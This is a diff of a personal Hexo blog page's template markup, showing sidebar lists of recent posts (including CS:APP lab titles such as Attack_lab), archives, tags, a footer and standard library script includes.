+        <article class="media">
+            
+            <a href="/2019/02/01/Ubuntu18-04安装TensorFlow-gpu/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Ubuntu18.04安装TensorFlow-gpu">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-02-01T09:06:10.000Z">2019-02-01</time></div>
+                    <a href="/2019/02/01/Ubuntu18-04安装TensorFlow-gpu/" class="has-link-black-ter is-size-6">Ubuntu18.04安装TensorFlow-gpu</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/python/">python</a> / <a class="has-link-grey -link" href="/categories/python/tensorflow/">tensorflow</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/12/28/I-O-lab/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="I/O_lab">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-28T09:16:28.000Z">2018-12-28</time></div>
+                    <a href="/2018/12/28/I-O-lab/" class="has-link-black-ter is-size-6">I/O_lab</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CS-APP/">CS:APP</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/12/09/Python数据清洗初步/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Python数据清洗初步">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-09T09:14:11.000Z">2018-12-09</time></div>
+                    <a href="/2018/12/09/Python数据清洗初步/" class="has-link-black-ter is-size-6">Python数据清洗初步</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Python/">Python</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/12/08/Attack-lab/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Attack_lab">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-08T09:49:57.000Z">2018-12-08</time></div>
+                    <a href="/2018/12/08/Attack-lab/" class="has-link-black-ter is-size-6">Attack_lab</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CS-APP/">CS:APP</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
 
         
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Archives
+        </h3>
+        <ul class="menu-list">
         
-      </div>
+        <li>
+            <a class="level is-marginless" href="/archives/2019/03/">
+                <span class="level-start">
+                    <span class="level-item">March 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/02/">
+                <span class="level-start">
+                    <span class="level-item">February 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/12/">
+                <span class="level-start">
+                    <span class="level-item">December 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">November 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">4</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+        
+            <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Tags
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Basic-NN/">
+                        <span class="tag">Basic NN</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/CS-APP/">
+                        <span class="tag">CS:APP</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ElementTree/">
+                        <span class="tag">ElementTree</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Logistic/">
+                        <span class="tag">Logistic</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Queue/">
+                        <span class="tag">Queue</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Stack/">
+                        <span class="tag">Stack</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/XML/">
+                        <span class="tag">XML</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/c/">
+                        <span class="tag">c</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/linux内核/">
+                        <span class="tag">linux内核</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ubuntu/">
+                        <span class="tag">ubuntu</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/串匹配/">
+                        <span class="tag">串匹配</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/二进制炸弹/">
+                        <span class="tag">二进制炸弹</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/代码注入攻击/">
+                        <span class="tag">代码注入攻击</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/广义表/">
+                        <span class="tag">广义表</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/数据清洗/">
+                        <span class="tag">数据清洗</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/汇编/">
+                        <span class="tag">汇编</span>
+                        <span class="tag is-grey">4</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/迷宫问题/">
+                        <span class="tag">迷宫问题</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+        
+        </div>
+    
+</div>
+
+                
+
+
+
+
+<div class="column is-4-tablet is-4-desktop is-3-widescreen is-hidden-touch is-hidden-desktop-only has-order-3 column-right ">
+    
+        
+<div class="card widget">
+    <div class="card-content">
+        <h3 class="menu-label">
+            Recent
+        </h3>
+        
+        <article class="media">
+            
+            <a href="/2019/03/09/DeepLearning1/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="DeepLearning1">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-03-09T12:45:21.000Z">2019-03-09</time></div>
+                    <a href="/2019/03/09/DeepLearning1/" class="has-link-black-ter is-size-6">DeepLearning1</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/DeepLearning/">DeepLearning</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2019/02/01/Ubuntu18-04安装TensorFlow-gpu/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Ubuntu18.04安装TensorFlow-gpu">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2019-02-01T09:06:10.000Z">2019-02-01</time></div>
+                    <a href="/2019/02/01/Ubuntu18-04安装TensorFlow-gpu/" class="has-link-black-ter is-size-6">Ubuntu18.04安装TensorFlow-gpu</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/python/">python</a> / <a class="has-link-grey -link" href="/categories/python/tensorflow/">tensorflow</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/12/28/I-O-lab/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="I/O_lab">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-28T09:16:28.000Z">2018-12-28</time></div>
+                    <a href="/2018/12/28/I-O-lab/" class="has-link-black-ter is-size-6">I/O_lab</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CS-APP/">CS:APP</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/12/09/Python数据清洗初步/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Python数据清洗初步">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-09T09:14:11.000Z">2018-12-09</time></div>
+                    <a href="/2018/12/09/Python数据清洗初步/" class="has-link-black-ter is-size-6">Python数据清洗初步</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/Python/">Python</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+        <article class="media">
+            
+            <a href="/2018/12/08/Attack-lab/" class="media-left">
+                <p class="image is-64x64">
+                    <img class="thumbnail" src="/images/thumbnail.svg" alt="Attack_lab">
+                </p>
+            </a>
+            
+            <div class="media-content">
+                <div class="content">
+                    <div><time class="has-text-grey is-size-7 is-uppercase" datetime="2018-12-08T09:49:57.000Z">2018-12-08</time></div>
+                    <a href="/2018/12/08/Attack-lab/" class="has-link-black-ter is-size-6">Attack_lab</a>
+                    <p class="is-size-7 is-uppercase">
+                        <a class="has-link-grey -link" href="/categories/CS-APP/">CS:APP</a>
+                    </p>
+                </div>
+            </div>
+        </article>
+        
+    </div>
+</div>
+
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+        <h3 class="menu-label">
+            Archives
+        </h3>
+        <ul class="menu-list">
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/03/">
+                <span class="level-start">
+                    <span class="level-item">March 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2019/02/">
+                <span class="level-start">
+                    <span class="level-item">February 2019</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">1</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/12/">
+                <span class="level-start">
+                    <span class="level-item">December 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">5</span>
+                </span>
+            </a>
+        </li>
+        
+        <li>
+            <a class="level is-marginless" href="/archives/2018/11/">
+                <span class="level-start">
+                    <span class="level-item">November 2018</span>
+                </span>
+                <span class="level-end">
+                    <span class="level-item tag">4</span>
+                </span>
+            </a>
+        </li>
+        
+        </ul>
+        </div>
+    </div>
+</div>
+    
+        <div class="card widget">
+    <div class="card-content">
+        <div class="menu">
+            <h3 class="menu-label">
+                Tags
+            </h3>
+            <div class="field is-grouped is-grouped-multiline">
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Basic-NN/">
+                        <span class="tag">Basic NN</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/CS-APP/">
+                        <span class="tag">CS:APP</span>
+                        <span class="tag is-grey">5</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ElementTree/">
+                        <span class="tag">ElementTree</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Logistic/">
+                        <span class="tag">Logistic</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Queue/">
+                        <span class="tag">Queue</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/Stack/">
+                        <span class="tag">Stack</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/XML/">
+                        <span class="tag">XML</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/c/">
+                        <span class="tag">c</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/linux内核/">
+                        <span class="tag">linux内核</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/ubuntu/">
+                        <span class="tag">ubuntu</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/串匹配/">
+                        <span class="tag">串匹配</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/二进制炸弹/">
+                        <span class="tag">二进制炸弹</span>
+                        <span class="tag is-grey">2</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/代码注入攻击/">
+                        <span class="tag">代码注入攻击</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/广义表/">
+                        <span class="tag">广义表</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/数据清洗/">
+                        <span class="tag">数据清洗</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/汇编/">
+                        <span class="tag">汇编</span>
+                        <span class="tag is-grey">4</span>
+                    </a>
+                </div>
+                
+                <div class="control">
+                    <a class="tags has-addons" href="/tags/迷宫问题/">
+                        <span class="tag">迷宫问题</span>
+                        <span class="tag is-grey">1</span>
+                    </a>
+                </div>
+                
+            </div>
+        </div>
+    </div>
+</div>
+    
+    
+</div>
+
+            </div>
+        </div>
+    </section>
+    <footer class="footer">
+    <div class="container">
+        <div class="level">
+            <div class="level-start has-text-centered-mobile">
+                <a class="footer-logo is-block has-mb-6" href="/">
+                
+                    <img src="/images/logo.svg" alt="Attack_lab" height="28">
+                
+                </a>
+                <p class="is-size-7">
+                &copy; 2019 Wmc&nbsp;
+                Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> & <a href="http://github.com/ppoffice/hexo-theme-icarus" target="_blank">Icarus_bess</a>
+                
+                </p>
+            </div>
+            <div class="level-end">
+            
+                <div class="field has-addons is-flex-center-mobile has-mt-5-mobile is-flex-wrap is-flex-middle">
+                
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Creative Commons" href="https://creativecommons.org/">
+                        
+                        <i class="fab fa-creative-commons"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/">
+                        
+                        <i class="fab fa-creative-commons-by"></i>
+                        
+                    </a>
+                </p>
+                
+                <p class="control">
+                    <a class="button is-white is-large" target="_blank" title="Download on GitHub" href="https://github.com/bessyjl">
+                        
+                        <i class="fab fa-github"></i>
+                        
+                    </a>
+                </p>
+                
+                </div>
+            
+            </div>
+        </div>
+    </div>
+</footer>
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script>
+<script>moment.locale("zh_Hans");</script>
+
+
+    
+    
+    
+    <script src="/js/animation.js"></script>
     
 
     
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script>
+    <script src="/js/gallery.js" defer></script>
+    
 
-  </div>
+    
+    
 
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+<div id="outdated">
+    <h6>Your browser is out-of-date!</h6>
+    <p>Update your browser to view this website correctly. <a id="btnUpdateBrowser" href="http://outdatedbrowser.com/">Update
+            my browser now </a></p>
+    <p class="last"><a href="#" id="btnCloseUpdateBrowser" title="Close">&times;</a></p>
+</div>
+<script src="https://cdn.jsdelivr.net/npm/outdatedbrowser@1.1.5/outdatedbrowser/outdatedbrowser.min.js" defer></script>
+<script>
+    document.addEventListener("DOMContentLoaded", function () {
+        outdatedBrowser({
+            bgColor: '#f25648',
+            color: '#ffffff',
+            lowerThan: 'flex'
+        });
+    });
 </script>
 
 
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-  
-
-
-  
-
-  
-
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.5/unpacked/MathJax.js?config=TeX-MML-AM_CHTML" defer></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    MathJax.Hub.Config({
+        'HTML-CSS': {
+            matchFontHeight: false
+        },
+        SVG: {
+            matchFontHeight: false
+        },
+        CommonHTML: {
+            matchFontHeight: false
+        },
+        tex2jax: {
+            inlineMath: [
+                ['$','$'],
+                ['\\(','\\)']
+            ]
+        }
+    });
+});
+</script>
+
+    
+    
+
+<a id="back-to-top" title="Back to Top" href="javascript:;">
+    <i class="fas fa-chevron-up"></i>
+</a>
+<script src="/js/back-to-top.js" defer></script>
+
+
+    
+    
+
+    
+    
+    
+    
+
+    
+    
+    
+    
+    
+    <script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" defer></script>
+    <script src="/js/clipboard.js" defer></script>
+    
+
+    
+    
+    
+
+
+<script src="/js/main.js" defer></script>
+
+    
+    <div class="searchbox ins-search">
+    <div class="searchbox-container ins-search-container">
+        <div class="searchbox-input-wrapper">
+            <input type="text" class="searchbox-input ins-search-input" placeholder="Type something...">
+            <span class="searchbox-close ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
+        </div>
+        <div class="searchbox-result-wrapper ins-section-wrapper">
+            <div class="ins-section-container"></div>
+        </div>
+    </div>
+</div>
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: 'Posts',
+                PAGES: 'Pages',
+                CATEGORIES: 'Categories',
+                TAGS: 'Tags',
+                UNTITLED: '(Untitled)',
+            },
+            CONTENT_URL: '/content.json',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script src="/js/insight.js" defer></script>
+<link rel="stylesheet" href="/css/search.css">
+<link rel="stylesheet" href="/css/insight.css">
+    
 </body>
 </html>
